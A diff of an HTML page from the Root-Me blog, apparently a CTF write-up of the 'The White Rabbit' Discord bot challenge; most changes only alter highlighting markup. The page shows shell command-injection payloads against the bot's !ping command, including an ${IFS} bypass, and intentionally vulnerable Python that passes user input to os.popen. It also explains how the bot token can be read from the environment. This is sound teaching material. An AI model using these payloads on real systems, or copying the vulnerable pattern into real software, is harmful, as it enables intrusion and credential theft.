@@ -7,10 +7,9 @@
         <title>Root-Me CTF 10k - The White Rabbit - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic"><meta property="og:title" content="Root-Me CTF 10k - The White Rabbit" />
 <meta property="og:description" content="Writeup of the &lsquo;The White Rabbit&rsquo; challenge during the Root-Me CTF 10k" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_the_white_rabbit/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_the_white_rabbit/" />
 <meta property="article:published_time" content="2023-02-28T00:00:00+00:00" />
 <meta property="article:modified_time" content="2023-02-28T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />
-
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Root-Me CTF 10k - The White Rabbit"/>
 <meta name="twitter:description" content="Writeup of the &lsquo;The White Rabbit&rsquo; challenge during the Root-Me CTF 10k"/>
@@ -155,7 +154,7 @@ Now that we understand a little better how our application reacts, let&rsquo;s t
         alt="https://nishacid.guru/assets/images/writeups/rm_ctf/whiterabbit_flag.png"
         title="thewhiterabbit-flag" /></p>
 <p>In fact, this is not the only <strong>payload</strong> that could successfully inject code, here is an example of a few others:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">!ping <span class="s2">&#34;; cat flag.txt &#34;</span>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">!ping <span class="s2">&#34;; cat flag.txt &#34;</span>
 
 <span class="c1"># ${IFS} =&gt; https://en.wikipedia.org/wiki/Input_Field_Separators</span>
 !ping 01.root-<span class="o">||</span>cat<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>flag.txt<span class="o">||</span>true#
@@ -171,7 +170,7 @@ Now that we understand a little better how our application reacts, let&rsquo;s t
 <h2 id="how-its-work-">How it&rsquo;s work ?</h2>
 <p>Ok we were able to exploit the vulnerability, but how does it work on the bot side?</p>
 <p>Here is the bot code (without security) that we will use for the example</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="kn">from</span> <span class="nn">discord.ext.commands</span> <span class="kn">import</span> <span class="n">Bot</span>
@@ -183,49 +182,49 @@ Now that we understand a little better how our application reacts, let&rsquo;s t
 
 <span class="c1"># Defines some variables</span>
 <span class="n">intents</span> <span class="o">=</span> <span class="n">discord</span><span class="o">.</span><span class="n">Intents</span><span class="o">.</span><span class="n">default</span><span class="p">()</span>
-<span class="n">intents</span><span class="o">.</span><span class="n">message_content</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">bot</span> <span class="o">=</span> <span class="n">commands</span><span class="o">.</span><span class="n">Bot</span><span class="p">(</span><span class="n">command_prefix</span><span class="o">=</span><span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="n">intents</span><span class="o">=</span><span class="n">intents</span><span class="p">,</span> <span class="n">help_command</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+<span class="n">intents</span><span class="o">.</span><span class="n">message_content</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">bot</span> <span class="o">=</span> <span class="n">commands</span><span class="o">.</span><span class="n">Bot</span><span class="p">(</span><span class="n">command_prefix</span><span class="o">=</span><span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="n">intents</span><span class="o">=</span><span class="n">intents</span><span class="p">,</span> <span class="n">help_command</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
 <span class="c1"># load .env file</span>
 <span class="n">load_dotenv</span><span class="p">()</span>
 
 <span class="c1"># Bot status and activity</span>
-<span class="nd">@bot</span><span class="o">.</span><span class="n">event</span>
-<span class="k">async</span> <span class="k">def</span> <span class="nf">on_ready</span><span class="p">():</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Ready !&#34;</span><span class="p">)</span>
+<span class="nd">@bot.event</span>
+<span class="n">async</span> <span class="k">def</span> <span class="nf">on_ready</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Ready !&#34;</span><span class="p">)</span>
     <span class="n">activity</span> <span class="o">=</span> <span class="n">discord</span><span class="o">.</span><span class="n">Game</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;No time to say hello, goodbye. I&#39;m late, late, late&#34;</span><span class="p">)</span>
-    <span class="k">return</span> <span class="k">await</span> <span class="n">bot</span><span class="o">.</span><span class="n">change_presence</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="n">discord</span><span class="o">.</span><span class="n">Status</span><span class="o">.</span><span class="n">online</span><span class="p">,</span> <span class="n">activity</span><span class="o">=</span><span class="n">activity</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">await</span> <span class="n">bot</span><span class="o">.</span><span class="n">change_presence</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="n">discord</span><span class="o">.</span><span class="n">Status</span><span class="o">.</span><span class="n">online</span><span class="p">,</span> <span class="n">activity</span><span class="o">=</span><span class="n">activity</span><span class="p">)</span>
 
 <span class="c1"># Help command function</span>
-<span class="nd">@bot</span><span class="o">.</span><span class="n">command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;help&#34;</span><span class="p">)</span>
-<span class="k">async</span> <span class="k">def</span> <span class="nf">help_cmd</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
+<span class="nd">@bot.command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;help&#34;</span><span class="p">)</span>
+<span class="n">async</span> <span class="k">def</span> <span class="nf">help_cmd</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">ctx</span><span class="p">:</span>
-        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\n</span><span class="s2">**You can use theses commands :**
+        <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\n</span><span class="s2">**You can use theses commands :**
 </span><span class="s2">                        ```</span><span class="se">\n</span><span class="s2">!help : print the help list</span><span class="se">\n</span><span class="s2">!ping : ping challengeXX.root-me.org</span><span class="se">\n</span><span class="s2"> exemple: !ping 01```&#34;&#34;&#34;</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;Please use !help to have list of commands&#34;</span><span class="p">)</span>
+        <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;Please use !help to have list of commands&#34;</span><span class="p">)</span>
 
 <span class="c1"># Ping command function</span>
-<span class="nd">@bot</span><span class="o">.</span><span class="n">command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;ping&#34;</span><span class="p">)</span>
-<span class="k">async</span> <span class="k">def</span> <span class="nf">ping</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">parameter</span><span class="p">):</span>
+<span class="nd">@bot.command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;ping&#34;</span><span class="p">)</span>
+<span class="n">async</span> <span class="k">def</span> <span class="nf">ping</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">parameter</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">parameter</span><span class="p">:</span>
-        <span class="n">sh</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;ping -c 3 challenge</span><span class="si">{</span><span class="n">parameter</span><span class="si">}</span><span class="s2">.root-me.org&#34;</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+        <span class="n">sh</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;ping -c 3 challenge{parameter}.root-me.org&#34;</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
         <span class="n">command</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
         <span class="k">if</span> <span class="s1">&#39;3 received&#39;</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
-            <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;challenge</span><span class="si">{</span><span class="n">parameter</span><span class="si">}</span><span class="s2">.root-me.org is up !</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+            <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;challenge{parameter}.root-me.org is up !</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
-            <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;challenge</span><span class="si">{</span><span class="n">parameter</span><span class="si">}</span><span class="s2">.root-me.org is down :(&#34;</span><span class="p">)</span>
-            <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;:x: Error log : </span><span class="se">\n</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;challenge{parameter}.root-me.org is down :(&#34;</span><span class="p">)</span>
+            <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;:x: Error log : </span><span class="se">\n</span><span class="s2">{command}&#34;</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;Please use a parameter&#34;</span><span class="p">)</span>
+        <span class="n">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;Please use a parameter&#34;</span><span class="p">)</span>
 
 <span class="c1"># Run</span>
 <span class="n">bot</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;TOKEN&#34;</span><span class="p">))</span>
 </code></pre></div><p>When we send a basic command like <code>!ping 01</code>, the bot executes this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ping -c <span class="m">3</span> challenge01.root-me.org
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ping -c <span class="m">3</span> challenge01.root-me.org
 </code></pre></div><p>However, if we go back to our previous tests and send the commands <code>!ping ;</code> and <code>!ping &quot;hello&quot;</code>, the return is quite different:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ;</span>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ;</span>
 ping -c <span class="m">3</span> challenge<span class="p">;</span>.root-me.org
 ping: challenge: Name or service not known
 /bin/sh: 1: .root-me.org: not found
@@ -235,14 +234,14 @@ ping -c <span class="m">3</span> challenge hello .root-me.org
 ping: .root-me.org: Name or service not known
 </code></pre></div><p>We can see that the <code>;</code> has been interpreted as a bash separator, and that it has interpreted <code>.root-me.org</code> as a new command.
 This means that the next command we send after the semicolon <code>;</code> will be executed by the server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># !ping &#34;; id ;&#34;</span>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># !ping &#34;; id ;&#34;</span>
 
 ping -c <span class="m">3</span> challenge<span class="p">;</span> id <span class="p">;</span>.root-me.org
 ping: challenge: Name or service not known
 <span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>chall<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>chall<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>chall<span class="o">)</span>
 /bin/sh: 1: .root-me.org: not found
 </code></pre></div><p>Now, we have a serious problem with this code. The <strong>token</strong> of the Discord bot is retrieved from the environment using the following code :</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">bot</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;TOKEN&#34;</span><span class="p">))</span>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">bot</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;TOKEN&#34;</span><span class="p">))</span>
 </code></pre></div><p>This means that anyone can get this <strong>token</strong> as below, and can modify the bot as they wish.</p>
 <p><img
         class="lazyload"
@@ -260,7 +259,7 @@ ping: challenge: Name or service not known
 <h3 id="architecture">Architecture</h3>
 <p>The architecture of the challenge is a bit more complex, it is based on 3 containers for a single bot.
 By the way, I greatly thank <a href="https://thinkloveshare.com" target="_blank" rel="noopener noreffer ">TheLaluka</a> who, around some beers and schematics resembling to steganography challenges, helped me a lot to realize this architecture.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">.
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">.
 ├── broker
 │   ├── broker.py
 │   ├── Dockerfile
@@ -321,7 +320,7 @@ By the way, I greatly thank <a href="https://thinkloveshare.com" target="_blank"
         title="whiterabbit-autoheal" /></p>
 <p>And thanks to this complete system, still 1 week after the CTF, there was no downtime, nor successful malicious action ( however you have tried ^^)</p>
 <h3 id="running">Running</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker-compose -f docker-compose.yml up -d 
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">docker-compose -f docker-compose.yml up -d 
 </code></pre></div><p>Thanks for reading, if you have any question about exploitation, configuration, the architecture or other you can DM me on <a href="https://twitter.com/Nishacid" target="_blank" rel="noopener noreffer ">Twitter</a> or Discord <code>Nishacid#1337</code>. Thanks again for helping me to <a href="https://thinkloveshare.com" target="_blank" rel="noopener noreffer ">TheLaluka</a> secure this challenge!</p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
